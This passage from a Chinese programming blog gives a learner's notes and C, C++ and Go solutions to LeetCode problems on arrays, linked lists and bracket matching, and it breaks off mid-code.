天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。\r随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。 示例 2:\n输入: [1,2,3,4,5]\r输出: 4\r解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。\r注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。\r因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。 示例 3:\n输入: [7,6,4,3,1]\r输出: 0\r解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。 提示：\n1 \u0026lt;= prices.length \u0026lt;= 3 * 10 ^ 4 0 \u0026lt;= prices[i] \u0026lt;= 10 ^ 4 代码:\n在做这道题目时，我进入了一个误区，就是老想着找这样一个子序列：子序列最后一个元素 - 子序列第一个元素的值最大。例如：[6 3 4 1 2 3 4 5 6]中sub[1 2 3 4 5 6]这个序列，我们只要确定1和6的位置就能得到结果。显然我想复杂了，这个结果6-1=5实际上与2-1 + 3-2 + 4-3 + 5-4 + 6-5 = 5是一样的。\n所以，我们只需每次找相邻的两个数，这两个数符合前一个数比后一个数小即可，符合就计算last-front的值，加到利润里，继续考察下一组数就可以。\nint maxProfit(int* prices, int pricesSize) { /* 不要忘记特殊情况 */ if (pricesSize \u0026lt; 2) { return 0; } int td_price = prices[0];\t// td_price为当天价格，从第 prices[0]开始 int pro = 0;\t// 初始利润设置为 pro=0 for (int i = 1; i \u0026lt; pricesSize; i++) { /* 从第二天开始，如果明天的价格高于今天，就买，利润增加 */ if (prices[i] \u0026gt; td_price) { pro += (prices[i] - td_price); } /* 过一天，明天变今天 */ td_price = prices[i]; } return pro; } 旋转数组 给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。\n示例 1:\n输入: [1,2,3,4,5,6,7] 和 k = 3\r输出: [5,6,7,1,2,3,4]\r解释:\r向右旋转 1 步: [7,1,2,3,4,5,6]\r向右旋转 2 步: [6,7,1,2,3,4,5]\r向右旋转 3 步: [5,6,7,1,2,3,4] 示例 2:\n输入: [-1,-100,3,99] 和 k = 2\r输出: [3,99,-1,-100]\r解释: 向右旋转 1 步: [99,-1,-100,3]\r向右旋转 2 步: [3,99,-1,-100] 说明:\n尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。 要求使用空间复杂度为 O(1) 的 原地 算法。 代码:\n我认为这道题目的一个解法是非常巧妙的，利用三次逆序，我是没有想到\u0026hellip;.\n例如示例1中输入 [1,2,3,4,5,6,7] 和 k = 3输出[5,6,7,1,2,3,4]。只需要先对前7-3=4个数进行逆序得到[4,3,2,1,5,6,7]再对后k=3个数进行逆序得到[4,3,2,1,7,6,5]，最后再对整个数组进行逆序[5,6,7,1,2,3,4]就得到结果了。\n/* 逆序函数，注意下标的操作 */ void reverse(int *arr, int left, int right) { for (int i = 0; i \u0026lt; (right - left + 1) / 2; i++) { int temp = arr[right - i]; arr[right - i] = arr[left + i]; arr[left + i] = temp; } } /* 进行旋转 */ void rotate(int* nums, int numsSize, int k) { // 注意特殊情况的处理 if (numsSize == 0 || !nums) { return; } // 以防循环次数 \u0026gt; numsSize k = k % numsSize; reverse(nums, 0, numsSize - k - 1); reverse(nums, numsSize - k, numsSize - 1); reverse(nums, 0, numsSize - 1); } 存在重复元素 给定一个整数数组，判断是否存在重复元素。\n如果任意一值在数组中出现至少两次，函数返回 true 。如果数组中每个元素都不相同，则返回 false 。\n示例 1:\n输入: [1,2,3,1]\r输出: true 示例 2:\n输入: [1,2,3,4]\r输出: false 示例 3:\n输入: [1,1,1,3,3,4,3,2,4,2]\r输出: true 代码:\n这道题目一开始构造Map来遍历统计每个值出现的次数，但是(我觉得)没有必要(对于C这种没有Map结构的来说)。就采取了先排序，后验证是否有相邻元素相同的方法来判断。\n一开始我是用了快排，结果一直超时，于是改成了归并。\n#define MAX 1000000 int temp_arr[MAX] = { 0 }; /* merge two arr */ void merge(int begin, int middle, int end, int arr1[], int arr2[]); /* sort arr with merge sort */ void merge_sort(int arr[], int begin, int end); bool containsDuplicate(int* nums, int numsSize) { if (numsSize \u0026lt;= 1) return false;\t// 注意特殊情况 merge_sort(nums, 0, numsSize - 1);\t// 先进行排序 for (int i = 0; i \u0026lt; numsSize - 1; i++) { if (nums[i] == nums[i+1]) { return true; } } return false; } /* merge two arr */ void merge(int begin, int middle, int end, int arr1[], int arr2[]) { int i = begin; int j = middle + 1; int k = begin; while (i \u0026lt;= middle \u0026amp;\u0026amp; j \u0026lt;= end) { if (arr1[i] \u0026lt;= arr1[j]) { arr2[k++] = arr1[i++]; } else { arr2[k++] = arr1[j++]; } } while (i \u0026lt;= middle)\tarr2[k++] = arr1[i++]; while (j \u0026lt;= end)\tarr2[k++] = arr1[j++]; } /* sort arr with merge sort */ void merge_sort(int arr[], int begin, int end) { int m; if (begin == end) { return;\t// if begin==end -\u0026gt; arr has one number,over } else { m = (begin + end) / 2; merge_sort(arr, begin, m);\t// sorted front part of arr merge_sort(arr, m + 1, end);\t// sorted latter part of arr merge(begin, m, end, arr, temp_arr);\t//merge arr for (int i = begin; i \u0026lt;= end; i++) { arr[i] = temp_arr[i]; } } } 只出现一次的数字 给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。\n说明：\n你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？\n示例 1:\n输入: [2,2,1]\r输出: 1 示例 2:\n输入: [4,1,2,1,2]\r输出: 4 代码:\n同样的，我也采用了先排序，后判断一个数的前后元素是否等于这个数的方法。由于归并排序上一题中已经给出，便不再叙述详细实现过程。\nint singleNumber(int* nums, int numsSize) { // 特殊情况的处理 if (numsSize == 1) { return nums[0]; } // 先排序 merge_sort(nums, 0, numsSize - 1); // 首末元素不好判断，就先进行判断 if (nums[0] != nums[1] \u0026amp;\u0026amp; nums[1]==nums[2]) { return nums[0]; } else if (nums[numsSize-1] != nums[numsSize-2]) { return nums[numsSize - 1]; } // 在这之前先判断第一个数和最后一个数 for (int i = 1; i \u0026lt; numsSize - 1; i++) { // 判断前后元素是否等于这个数 if (nums[i] != nums[i - 1] \u0026amp;\u0026amp; nums[i] != nums[i + 1]) { return nums[i]; } } // 如果此处没有返回，会报错，便随便加上一句，理论上不会走到这里 return -1; } 两个数组的交集 给定两个数组，编写一个函数来计算它们的交集。\n示例 1:\n输入: nums1 = [1,2,2,1], nums2 = [2,2]\r输出: [2,2] 示例 2:\n输入: nums1 = [4,9,5], nums2 = [9,4,9,8,4]\r输出: [4,9] 说明：\n输出结果中每个元素出现的次数，应与元素在两个数组中出现的次数一致。 我们可以不考虑输出结果的顺序。 进阶:\n如果给定的数组已经排好序呢？你将如何优化你的算法？ 如果 nums1 的大小比 nums2 小很多，哪种方法更优？ 如果 nums2 的元素存储在磁盘上，磁盘内存是有限的，并且你不能一次加载所有的元素到内存中，你该怎么办？ 代码:\n进阶部分尚未考虑。\n在这里，我用到了双重循环，所以在效率上不是很理想。\n首先以nums1的长度为基准，构造新的结果数组numret； 遍历nums1数组，i为遍历指针； 判断nums1、nums2、numret中元素nums1[i]的个数，分别存入n1、n2、n3； 如果n3=0代表结果数组中还没有这个元素，于是判断n1、n2，以小的那一个作为存入的次数，存入numret中即可； 当然，如果n3!=0就说明我们在前面已经找过这个元素了，也就是我们只在首次遇到这个元素时就把它后面也出现的情况处理了 /** * Note: The returned array must be malloced, assume caller calls free(). */ /* 判断元素在数组中出现几次 */ int If_In_Array(int number, int numsSize, int *nums) ； int* intersect(int* nums1, int nums1Size, int* nums2, int nums2Size, int* returnSize) { /* 以nums1的长度构建数组 */ int *numret = (int*)malloc(sizeof(int)*nums1Size); int i3 = 0;\t// i3作为结果数组的下标，刚好可以统计结果数组中元素的个数 for (int i1 = 0; i1 \u0026lt; nums1Size; i1++) { int n1 = 0, n2 = 0, n3 = 0; n1 = If_In_Array(nums1[i1], nums1Size, nums1); n2 = If_In_Array(nums1[i1], nums2Size, nums2); n3 = If_In_Array(nums1[i1], i3, numret); if (n3 == 0) { if (n1 == n2) for (int p = 0; p \u0026lt; n1; p++) numret[i3++] = nums1[i1]; else if (n1 \u0026gt; n2) for (int p = 0; p \u0026lt; n2; p++) numret[i3++] = nums1[i1]; else if (n1 \u0026lt; n2)for (int p = 0; p \u0026lt; n1; p++) numret[i3++] = nums1[i1]; } } *returnSize = i3; return numret; } /* 判断元素在数组中出现几次 */ int If_In_Array(int number, int numsSize, int *nums) { int count = 0; for (int i = 0; i \u0026lt; numsSize; i++) { if (nums[i] == number) count++; } return count; } 加一 给定一个由整数组成的非空数组所表示的非负整数，在该数的基础上加一。\n最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。\n你可以假设除了整数 0 之外，这个整数不会以零开头。\n示例 1:\n输入: [1,2,3]\r输出: [1,2,4]\r解释: 输入数组表示数字 123。 示例 2:\n输入: [4,3,2,1]\r输出: [4,3,2,2]\r解释: 输入数组表示数字 4321。 代码:\n我犯了一个大错误：一开始我想将数组内容先转换成整数类型，然后整数加一，再进行拆分重新存入数组。结果发生了溢出，于是我改成long甚至long long，无一例外，它还是溢出了，谁能保证这个数组长度没有10k位呢，计算机怎么存一个10k位的数值类型？\n还是直接操作数组吧：\n注意判断数组元素是否全是9，例如[9,9,9,9]在申请结果数组时需要多申请一个位置，而[8,9,9,9]就不需要(这一步可不用一开始就进行)； 首先，对于首位进位有两种情况，需要先处理一下，一是全是9，二是除了首元素之外全是9； 如果全是9申请长一个单位的数组，首位置1，剩余填0，完成； 如果除首位全是9，申请通长度数组，首位加1，其余位填0，完成； 剩下的情况就是一般情况了，从数组末位开始向前遍历，只要遇到一位不是9就加1退出循环，完成，否则遇到9就置零，进行下一次循环。 int* plusOne(int* digits, int digitsSize, int* returnSize) { // 基本思路 逢 9 进一 不为9 +1 然后结束 // 1 先判断是否全为9 分两种情况 1）全为9 2） 第一位不是9 int is9 = 1; for (int i = 1; i \u0026lt; digitsSize; i++) if (digits[i] != 9) { is9 = 0; break; } if (is9 == 1) { if (digits[0] == 9) { // 如果第一位也是9 // 此时全为9 int *redigits = (int*)malloc(sizeof(int)*(digitsSize + 1)); redigits[0] = 1; for (int i = 1; i \u0026lt; digitsSize + 1; i++) { redigits[i] = 0; } *returnSize = digitsSize + 1; return redigits; } else{ // 此时第一位不是9 int *redigits = (int*)malloc(sizeof(int)*(digitsSize)); redigits[0] = digits[0] + 1; for (int i = 1; i \u0026lt; digitsSize; i++) { redigits[i] = 0; } *returnSize = digitsSize; return redigits; } } // 如果有一位不是9 int *redigits = (int*)malloc(sizeof(int)*(digitsSize)); redigits = digits; /*for (int n = 0; n \u0026lt; digitsSize; n++) { redigits[n] = digits[n]; }*/ for (int p = digitsSize - 1; p \u0026gt; -1; p--) { if (redigits[p] == 9) { redigits[p] = 0; continue; } if (redigits[p] != 9) { redigits[p] = redigits[p] + 1; break; } } *returnSize = digitsSize; return redigits; } 移动零 给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。\n示例:\n输入: [0,1,0,3,12]\r输出: [1,3,12,0,0] 说明:\n必须在原数组上操作，不能拷贝额外的数组。 尽量减少操作次数。 代码:\n使用的是数组题目中常用的快慢指针，慢指针始终指向数组中第一个0，快指针作为遍历指针，如果快指针指的元素不为0那么交换两个指针所指的元素，慢指针增一。\nvoid moveZeroes(int* nums, int numsSize) { int k = 0; for (int i = 0; i \u0026lt; numsSize; i++) { if (nums[i] != 0) { int t = nums[k]; nums[k++] = nums[i]; nums[i] = t; } } } 两数之和 给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。\n你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。\n示例:\n给定 nums = [2, 7, 11, 15], target = 9\r因为 nums[0] + nums[1] = 2 + 7 = 9\r所以返回 [0, 1] 代码:\nemmmm这个做的时候没多想暴力做的，二重循环\u0026hellip;\n/** * Note: The returned array must be malloced, assume caller calls free(). */ int* twoSum(int* nums, int numsSize, int target, int* returnSize) { /* 先处理一下特殊情况 */ if (numsSize == 0) { *returnSize = 0; return NULL; } else if (numsSize == 1) { int *ret1 = (int*)malloc(sizeof(int) * 1); ret1[0] = 0; *returnSize = 1; return ret1; } int *ret = (int*)malloc(sizeof(int) * 2); for (int i = 0; i \u0026lt; numsSize; i++) { for (int j = 0; j \u0026lt; numsSize; j++) { if (i == j) continue; else{ if (nums[i] + nums[j] == target) { ret[0] = i; ret[1] = j; } } } } *returnSize = 2; return ret; } 这个题有好多佬用hash table做的，时间上很快。\n有效的数独 到这里多少做的不是很顺了，总是少考虑东西\n判断一个 9x9 的数独是否有效。只需要根据以下规则，验证已经填入的数字是否有效即可。\n数字 1-9 在每一行只能出现一次。 数字 1-9 在每一列只能出现一次。 数字 1-9 在每一个以粗实线分隔的 3x3 宫内只能出现一次。 上图是一个部分填充的有效的数独。\n数独部分空格内已填入了数字，空白格用 '.' 表示。\n示例 1:\n输入:\r[\r[\u0026#34;5\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;],\r[\u0026#34;6\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;5\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;],\r[\u0026#34;.\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;.\u0026#34;],\r[\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;3\u0026#34;],\r[\u0026#34;4\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;1\u0026#34;],\r[\u0026#34;7\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;6\u0026#34;],\r[\u0026#34;.\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;],\r[\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;4\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;5\u0026#34;],\r[\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;9\u0026#34;]\r]\r输出: true 示例 2:\n输入:\r[\r[\u0026#34;8\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;],\r[\u0026#34;6\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;5\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;],\r[\u0026#34;.\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;.\u0026#34;],\r[\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;3\u0026#34;],\r[\u0026#34;4\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;1\u0026#34;],\r[\u0026#34;7\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;6\u0026#34;],\r[\u0026#34;.\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;],\r[\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;4\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;5\u0026#34;],\r[\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;9\u0026#34;]\r]\r输出: false\r解释: 除了第一行的第一个数字从 5 改为 8 以外，空格内其他数字均与 示例1 相同。\r但由于位于左上角的 3x3 宫内有两个 8 存在, 因此这个数独是无效的。 说明:\n一个有效的数独（部分已被填充）不一定是可解的。 只需要根据以上规则，验证已经填入的数字是否有效即可。 给定数独序列只包含数字 1-9 和字符 '.' 。 给定数独永远是 9x9 形式的。 代码:\n对于判断一行/列中是否存在相同元素，构造辅助二维数组，只不过二维数组每一行每一个元素代表原数组中这一行中的元素出现的次数，举个例子吧，原数组第一行[1，2，.，.，4，.，4，.，.]这样，那么辅助数组这样[0，1，1，0，2，...]没错，下标为4的位置为2，也就是4出现了两次，对于列，同理； 如何判断3x3的子块中有重复元素呢？也用一个二维数组，公式(i / 3) * 3 + (j / 3)巧妙的把位于同一个子块的元素的二维值转化为统一的一维值，也就是说，例如左上角(0,0)(0,1)(0,2)(1,0)(1,1)(1,2)(2,0)(2,1)(2,2)都转化成0了，就作为辅助数组的行下标，列下标同样的用原数组的元素值代表。 bool isValidSudoku(char** board, int boardSize, int* boardColSize) { int row[9][10] = { 0 }; int arr[9][10] = { 0 }; int box[9][10] = { 0 }; for (int i = 0; i \u0026lt; 9; i++) { for (int j = 0; j \u0026lt; 9; j++) { if (board[i][j] != \u0026#39;.\u0026#39;) { int num = board[i][j] - \u0026#39;0\u0026#39;;\t// 得到此数字对应的整数值 row[i][num]++;\t// 代表 在第i行 数字 num 出现次数 +1 arr[j][num]++;\t// 代表 在第j列 数字 num 出现次数 +1 box[(i / 3) * 3 + (j / 3)][num]++;\t// 代表 在第(i / 3) * 3 + (j / 3)个小九宫格中 数字 num 出现次数 +1 if ((row[i][num] \u0026gt; 1) || (arr[j][num] \u0026gt; 1) || (box[(i / 3) * 3 + (j / 3)][num] \u0026gt; 1)) {\treturn false; } } } } return true; } 旋转图像 给定一个 n × n 的二维矩阵表示一个图像。\n将图像顺时针旋转 90 度。\n说明：\n你必须在原地旋转图像，这意味着你需要直接修改输入的二维矩阵。请不要使用另一个矩阵来旋转图像。\n示例 1:\n给定 matrix = [\r[1,2,3],\r[4,5,6],\r[7,8,9]\r],\r原地旋转输入矩阵，使其变为:\r[\r[7,4,1],\r[8,5,2],\r[9,6,3]\r] 示例 2:\n给定 matrix =\r[\r[ 5, 1, 9,11],\r[ 2, 4, 8,10],\r[13, 3, 6, 7],\r[15,14,12,16]\r], 原地旋转输入矩阵，使其变为:\r[\r[15,13, 2, 5],\r[14, 3, 4, 1],\r[12, 6, 8, 9],\r[16, 7,10,11]\r] 代码:\n这里对操作二重指针和二维数组出现了迷糊，C的指针稍稍操作复杂一些还是好难懂\u0026hellip;\n我认为很巧妙的方法，对矩阵进行行变换，然后再进行转置(先进行转置，再对矩阵进行列变换也可以得到一样的结果)，没有仔细的观察、并且对矩阵不敏感的情况下很难发现这个规律。\n进行矩阵转置是要注意下标的处理，在进行行变换时巧妙的运用一级指针(如果进行列变换就没有这么容易了，所以说先进行行变换再进行转置是相对比较方便的)。\nvoid rotate(int** matrix, int matrixSize, int* matrixColSize) { // 先变换行，因为每一行可以作为一整块，在存储操作上比较方便 for (int i = 0, j = matrixSize - 1; i \u0026lt; j; ++i, --j) /* 将矩阵的第i行和第j行互换 */ swap_row(matrix, matrixSize, i, j); // 再对矩阵进行转置 transposed_matrix(matrix, matrixSize); } /* 求转置矩阵 */ void transposed_matrix(int **matrix, int matrixSize) { for (int i = 0; i \u0026lt; matrixSize; i++) { for (int j = i; j \u0026lt; matrixSize; j++) { int temp = matrix[i][j]; matrix[i][j] = matrix[j][i]; matrix[j][i] = temp; } } } /* 将矩阵第i行和第size-i行互换 */ void swap_row(int **matrix, int matrixSize, int i, int j) { // 申请存储单元，方便按行存储，只需交换指针，即可每次操作改变一行 int *t = (int*)malloc(sizeof(int)*matrixSize); t = matrix[i]; matrix[i] = matrix[j]; matrix[j] = t; } ","date":"2020-05-11T19:48:37+08:00","permalink":"https://lizonglingo.github.io/p/leetcode%E6%95%B0%E7%BB%84%E5%88%9D%E7%AD%89%E6%95%B4%E7%90%86/","title":"leetcode数组初等整理"},{"content":" 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/ 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。\nleetcode001-两数之和 题目重述 给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。\n你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。\n给定 nums = [2, 7, 11, 15], target = 9\r因为 nums[0] + nums[1] = 2 + 7 = 9\r所以返回 [0, 1] 题解 程序员小吴(C++) Karl Xavier(Go)\nC++版本思路及代码 设置一个map容器和record用来记录元素的值与索引，然后遍历数组nums。\n每次遍历中使用临时变量complement用来保存目标值与当前值的差值 在此次遍历中查找record，查看是否有与complement一致的值，如果查找成功则返回查找值的索引与当前nums中变量值的索引i 如果未找到，则在record中保存该元素与索引值i #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;unordered_map\u0026gt; using namespace std; class Solution { public: vector\u0026lt;int\u0026gt; twoSum(vector\u0026lt;int\u0026gt; \u0026amp;nums, int target) { unordered_map\u0026lt;int, int\u0026gt; record; for (int i = 0; i \u0026lt; nums.size(); ++i) { int complement = target - nums[i]; if (record.find(complement) != record.end()) { // 如果在 map 里没有查找到，就返回 end() int res[] = {i, record[complement]}; cout \u0026lt;\u0026lt; res \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; res + 2 \u0026lt;\u0026lt; endl; return vector\u0026lt;int\u0026gt;(res, res + 2); } record[nums[i]] = i; // 查到了， 将原数组值变为其下标 } return vector\u0026lt;int\u0026gt;(); } }; // [2,7,11,15] // 9 int main() { vector\u0026lt;int\u0026gt; nums = {2, 7, 11, 15}; vector\u0026lt;int\u0026gt; res; int target = 9; Solution s = *new Solution(); res = s.twoSum(nums, target); for (int i = 0; i \u0026lt; res.size(); ++i) { cout \u0026lt;\u0026lt; res[i] \u0026lt;\u0026lt; endl; } } Go版本思路及代码 创建map映射v，存放目标数组的相关信息 遍历目标数组，并获取目标值target与数组元素nums[i]的差值dif 将差值dif作为map中的key，目标数组nums的索引作为map中的value 判断map中是否包含差值dif，如果包含则返回对应的value 如果map中没有，则把其放到map中 package main import \u0026#34;fmt\u0026#34; func twoSum(nums []int, target int) []int { v := make(map[int]int) for i := 0; i \u0026lt; len(nums); i++ { dif := target - nums[i] c, ok := v[dif] if ok != false { return []int{c, i} } v[nums[i]] = i } return []int{-1, -1} } // [2,7,11,15] // 9 func main() { target := 9 nums := []int{2, 7, 11, 15} fmt.Print(twoSum(nums, target)) } leetcode002-两数相加 题目重述 给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。\n如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。\n您可以假设除了数字 0 之外，这两个数都不会以 0 开头。\n输入：(2 -\u0026gt; 4 -\u0026gt; 3) + (5 -\u0026gt; 6 -\u0026gt; 4)\r输出：7 -\u0026gt; 0 -\u0026gt; 8\r原因：342 + 465 = 807 题解 陈乐乐(c++) dp0qb(go)\nC++版本思路及代码 将长度较短的链表在末尾补0使得两个链表长度相等，然后再一个一个元素对其相加，需要注意的是要考虑进位。\n获取两个链表的长度 较短的链表末尾补零 对齐相加，注意考虑进位 struct ListNode { int val; ListNode *next; ListNode(int x) : val(x), next(NULL) {} // 定义链表的构造方法 }; class Solution { public: ListNode *addTwoNumbers(ListNode *l1, ListNode *l2) { int len1 = 1; // 记录L1的长度 int len2 = 1; // 记录L2的长度 ListNode *p = l1; ListNode *q = l2; while (p-\u0026gt;next != NULL) { // 获取 L1 的长度 len1++; p = p-\u0026gt;next; } while (q-\u0026gt;next != NULL) { // 获取 L2 的长度 len2++; q = q-\u0026gt;next; } if (len1 \u0026gt; len2) { // 如果 L1 比 L2 长，在 L2 末尾补零 for (int i = 0; i \u0026lt;= len1 - len2; ++i) { q-\u0026gt;next = new ListNode(0); q = q-\u0026gt;next; } } else { // L2 长 就在 L1 后面补 0 for (int i = 0; i \u0026lt;= len2 - len1; ++i) { p-\u0026gt;next = new ListNode(0); p = p-\u0026gt;next; } } p = l1; q = l2; bool count = false; // 记录进位 ListNode *l3 = new ListNode(-1); // 结果链表 ListNode *w = l3; // L3 的移动指针 int i = 0; // 记录相加结果 while (p != NULL \u0026amp;\u0026amp; q != NULL) { i = count + p-\u0026gt;val + q-\u0026gt;val; w-\u0026gt;next = new ListNode(i % 10); count = i \u0026gt;= 10 ? true : false; w = w-\u0026gt;next; p = p-\u0026gt;next; q = q-\u0026gt;next; } if (count) { // 如果最后还有进位 w-\u0026gt;next = new ListNode(1); w = w-\u0026gt;next; } return l3-\u0026gt;next; // L3 头为 -1 } }; Go版本思路及代码 依次正常遍历链表，按照对应位两数相加，如果超过10，则取结果的个位数，下一位加1 如果一个链表比另一个链表短，那么长的链表就直接加0 如果最后一位相加之和大于10，那么最后不要忘记加上一个1结点 /** Definition for singly-linked list. **/ type ListNode struct { Val int Next *ListNode } func addTwoNumbers(l1 *ListNode, l2 *ListNode) *ListNode { var i, s int // 分别表示 相加是否大于10 ，以及 两数之和 res := \u0026amp;ListNode{Val: 0} // 头结点 now := res // 当前节点 for true { if i \u0026gt; 0 { // 前面两数之和大于10，当前的和加 1 s = l1.Val + l2.Val + 1 } else { s = l1.Val + l2.Val } if s \u0026gt;= 10 { // 两数之和大于10 该位 s-10 否则就是 本身，并设置 i标记 now.Next = \u0026amp;ListNode{Val: s - 10} i = 1 } else { now.Next = \u0026amp;ListNode{Val: s} i = 0 } now = now.Next // 当 l1 和 l2 移到最后 if l1.Next == nil \u0026amp;\u0026amp; l2.Next == nil { // 如果 l1 l2 最后的和大于10 即i==1 那么后面还需要加一个 1 if i == 1 { now.Next = \u0026amp;ListNode{Val: 1} } break; } // l1 到最后 如果是 l2 没结束，把 l1 当前结点设置为0 继续和 l2 相加，否则后移指针 if l1.Next == nil { l1.Val = 0 } else { l1 = l1.Next } // 同理 对 l2 有 if l2.Next == nil { l2.Val = 0 } else { l2 = l2.Next } } // 返回头结点的下一个结点指针 return res.Next } leetcode020-有效的括号 题目重述 给定一个只包括 \u0026lsquo;(\u0026rsquo;，\u0026rsquo;)\u0026rsquo;，\u0026rsquo;{\u0026rsquo;，\u0026rsquo;}\u0026rsquo;，\u0026rsquo;[\u0026rsquo;，\u0026rsquo;]\u0026rsquo; 的字符串，判断字符串是否有效。\n有效字符串需满足：\n左括号必须用相同类型的右括号闭合。 左括号必须以正确的顺序闭合。 注意空字符串可被认为是有效字符串。\n示例 1:\r输入: \u0026#34;()\u0026#34;\r输出: true\r示例 2:\r输入: \u0026#34;()[]{}\u0026#34;\r输出: true\r示例 3:\r输入: \u0026#34;(]\u0026#34;\r输出: false\r示例 4:\r输入: \u0026#34;([)]\u0026#34;\r输出: false\r示例 5:\r输入: \u0026#34;{[]}\u0026#34;\r输出: true 题解 c***6(c++) chris(go)\nC++版本思路及代码 使用vector来模拟栈 每次取前半括号包括(、[、{都将其入栈 如果取到的是后半括号)、]、}就与取栈顶元素进行匹配，如果匹配就进行出栈操作，不匹配就返回错误 class Solution { 